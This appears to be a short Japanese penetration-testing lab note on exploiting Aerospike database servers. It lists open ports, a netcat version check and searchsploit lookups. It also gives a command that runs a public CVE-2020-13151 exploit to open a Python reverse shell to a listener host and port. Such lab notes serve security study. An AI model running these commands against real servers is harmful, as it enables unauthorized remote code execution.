# AeroSpike(3000,3001,3003)

```bash
3000/tcp open  ppp
3003/tcp open  cgms
```

```bash
nc -nv 192.168.168.143 3003
help #コマンド一覧
version #製品バージョン確認
```

```
searchsploit aerospike
```

![image-20230401093836869](img/Aerospike(3003)/image-20230401093836869.png)

以下パッチが刺さる

https://github.com/b4ny4n/CVE-2020-13151

```bash
python cve2020-13151.py --ahost 192.168.154.143 --aport=3000 --pythonshell --lhost 192.168.119.154 --lport 8000
```

※3003ではなく3000を指定する必要あり

Exploit-dbはこちら（うまく刺さらない場合）

```
searchsploit -m 49067 
```

